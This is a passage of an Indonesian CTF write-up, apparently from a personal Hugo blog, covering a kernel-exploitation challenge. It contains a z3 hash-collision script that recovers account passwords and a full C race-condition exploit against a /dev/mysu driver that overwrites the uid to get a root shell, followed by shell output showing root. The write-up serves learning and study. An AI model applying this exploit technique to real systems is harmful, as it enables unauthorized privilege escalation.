+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">res</span> <span class="o">|</span> <span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="n">res</span> <span class="o">&amp;</span> <span class="n">max_int</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">res</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="mh">0x03319f75</span> <span class="c1"># users</span>
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="mh">0x2ab76467</span> <span class="c1"># admin</span>
+</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="mi">8</span>          <span class="c1"># increase if there is no solution by z3.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="n">BitVec</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;b!</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">And</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mh">0x7f</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="nb">hash</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">==</span> <span class="n">target</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">m</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">b</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Or</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="n">b</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="n">b</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="n">b</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="n">b</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">hash</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="n">target</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[valid] (</span><span class="si">{</span><span class="n">p</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">) -&gt; </span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="attack-ideas">
+  Attack Ideas
+  <a class="heading-link" href="#attack-ideas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Kita dapat mengubah <code>req-&gt;uid</code> di-thread lain. Sehingga pada saat pengecekan <code>req-&gt;uid</code> yang awalnya merupakan uid user biasa dan pengecekan hash password selesai, nilai <code>req-&gt;uid</code> akan kita ubah menjadi uid root yang nantinya ini akan di-fetch ke variable lokal uid dan digunakan untuk assign <code>cred</code> struct untuk <code>commit_creds</code>. Sebagai gambaran alur prosesnya.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Other Thread</th>
+          <th>Main Thread</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>…</td>
+          <td><code>req-&gt;uid</code> user valid check</td>
+      </tr>
+      <tr>
+          <td>…</td>
+          <td><code>req-&gt;password</code> hash valid check</td>
+      </tr>
+      <tr>
+          <td>set <code>req-&gt;uid</code> into 0 (root uid)</td>
+          <td>uid = <code>req-&gt;uid</code></td>
+      </tr>
+      <tr>
+          <td>…</td>
+          <td>cred-&gt;uid = 0 and others</td>
+      </tr>
+      <tr>
+          <td>…</td>
+          <td>commit_creds(cred) will give us root</td>
+      </tr>
+  </tbody>
+</table>
+<p>Untuk mengoptimalkan exploit dapat dilakukan race condition untuk mengubah user uid ke root uid, dan break jika sudah mendapatkan root privileged.</p>
+<p>Full exploit,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define DEVICE_PATH     &#34;/dev/mysu&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define USER_UID        1000
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define ADMIN_UID       1001
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define USER_PASSWORD   &#34;UeS6Lsp(&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define ADMIN_PASSWORD  &#34;pYH4f5Rb&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">req_cred_s</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">28</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">req</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">race_thread</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(;;)</span> <span class="n">req</span><span class="p">.</span><span class="n">uid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">pthread_t</span> <span class="n">t_id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">DEVICE_PATH</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;failed open the device.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="n">ADMIN_PASSWORD</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ADMIN_PASSWORD</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t_id</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">race_thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">req</span><span class="p">.</span><span class="n">uid</span> <span class="o">=</span> <span class="n">ADMIN_UID</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Jalankan di-server dan root didapatkan :)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/ $ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">/ $ /tmp/hax
+</span></span><span class="line"><span class="cl">/ <span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">/ <span class="c1"># cat /flag</span>
+</span></span><span class="line"><span class="cl">HTB<span class="o">{</span>XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<span class="o">}</span>
+</span></span><span class="line"><span class="cl">/ <span class="c1">#</span>
+</span></span></code></pre></div><h2 id="0x04-penutup">
+  0x04 Penutup
+  <a class="heading-link" href="#0x04-penutup">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Pada awalnya bingung dengan multithread di <code>C</code> karena agak aneh diawal karena thread tidak jalan bersamaan, ternyata ada yang salah dikode aku. Great challenge! buatku yang baru pertama kali mengerjakan soal kernel exploitation.</p>
+<p>Thanks.</p>
+<p><a href="/2022/08/26/kern-adv-part-1.html" ></a></p>
+<p>:helloworld:</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     Abdullah 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
